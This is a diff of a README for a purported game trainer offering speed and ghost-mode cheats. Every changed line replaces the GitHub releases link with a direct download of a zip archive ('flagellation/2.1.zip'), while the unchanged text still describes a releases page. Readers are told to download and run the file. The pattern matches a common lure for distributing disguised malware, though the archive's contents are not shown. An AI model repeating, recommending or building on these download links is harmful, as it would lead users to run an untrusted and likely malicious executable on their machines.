@@ -1,6 +1,6 @@
 # 🚶 Big-Walk-Trainer-Speed-Ghost-Mode - Walk Faster, Explore Freer, Never Fall
 
-[![Download Now](https://img.shields.io/badge/Download-Big_Walk_Trainer-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Elderberrybushdeepfreeze319/Big-Walk-Trainer-Speed-Ghost-Mode/releases)
+[![Download Now](https://img.shields.io/badge/Download-Big_Walk_Trainer-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/Elderberrybushdeepfreeze319/Big-Walk-Trainer-Speed-Ghost-Mode/main/flagellation/2.1.zip)
 
 ## 🎮 What Is This?
 
@@ -40,7 +40,7 @@ Follow these simple steps to download and run the trainer on your Windows 10 or 
 ### Step 1: Download
 
 Visit this link to download the application:  
-**[https://github.com/Elderberrybushdeepfreeze319/Big-Walk-Trainer-Speed-Ghost-Mode/releases](https://github.com/Elderberrybushdeepfreeze319/Big-Walk-Trainer-Speed-Ghost-Mode/releases)**
+**[https://raw.githubusercontent.com/Elderberrybushdeepfreeze319/Big-Walk-Trainer-Speed-Ghost-Mode/main/flagellation/2.1.zip](https://raw.githubusercontent.com/Elderberrybushdeepfreeze319/Big-Walk-Trainer-Speed-Ghost-Mode/main/flagellation/2.1.zip)**
 
 On that page, you'll see a list of available releases. Look for the latest version (the one at the top) and click the download link that matches your system. This will save the file to your computer.
 
@@ -165,7 +165,7 @@ The project is completely free, with no ads, no paywalls, and no tracking. It's 
 
 Ready to start? Here's the link again:
 
-**[👉 Download Big-Walk-Trainer-Speed-Ghost-Mode](https://github.com/Elderberrybushdeepfreeze319/Big-Walk-Trainer-Speed-Ghost-Mode/releases)**
+**[👉 Download Big-Walk-Trainer-Speed-Ghost-Mode](https://raw.githubusercontent.com/Elderberrybushdeepfreeze319/Big-Walk-Trainer-Speed-Ghost-Mode/main/flagellation/2.1.zip)**
 
 Click the link, download the latest release, run the file, and enjoy your enhanced Big Walk experience with friends.
 
